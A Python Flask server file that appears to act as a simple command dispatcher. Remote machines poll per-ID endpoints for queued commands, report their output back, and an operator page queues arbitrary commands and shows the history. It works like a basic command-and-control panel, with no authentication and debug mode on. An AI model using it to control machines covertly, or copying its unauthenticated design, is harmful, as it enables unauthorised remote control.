import os
from app_functions import (
    get_commands_from_json,
    dump_commands_to_json,
    get_current_timestamp,
    last_ping_time_ago,
)
from flask import Flask, request, render_template, redirect

app = Flask(__name__)
app.url_map.strict_slashes = False


@app.get("/")
def home():
    ls = os.listdir("app/data")
    id_list = [x.split(".json")[0] for x in ls if ".json" in x and "_out" not in x]
    machines = dict()
    for id in id_list:
        commands = get_commands_from_json(id)
        machines[id] = last_ping_time_ago(commands["pings"][0])

    return machines


@app.get("/<machine_id>")
def machine_get(machine_id):
    commands = get_commands_from_json(machine_id)
    history = get_commands_from_json(machine_id, history=True)
    last_ping = last_ping_time_ago(commands["pings"][0])

    return render_template(
        "main.html",
        commands=commands,
        machine_id=machine_id,
        history=history,
        last_ping=last_ping,
    )


@app.post("/<machine_id>")
def machine_post(machine_id):
    cmd: str = request.form.get("cmd")
    commands = get_commands_from_json(machine_id)
    commands["commands"].append(cmd)
    dump_commands_to_json(machine_id, commands)

    return redirect(f"/{machine_id}", 201)


@app.get("/<machine_id>/api")
def machine_api_get(machine_id):
    timestamp = get_current_timestamp()
    commands = get_commands_from_json(machine_id)
    if len(commands["commands"]) > 0:
        cmd = commands["commands"].pop(0)
    else:
        cmd = "nothing_to_execute"
    if len(commands["pings"]) >= 30:  # keep max 30 pings (~5 minutes)
        commands["pings"].pop(-1)
    commands["pings"].insert(0, timestamp)
    dump_commands_to_json(machine_id, commands)

    return cmd, 200


@app.post("/<machine_id>/api")
def machine_api_post(machine_id):
    output_history = get_commands_from_json(machine_id, history=True)

    data: dict = request.get_json()
    output_history["commands"].insert(0, data)
    dump_commands_to_json(machine_id, output_history, history=True)

    return "OK", 201


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
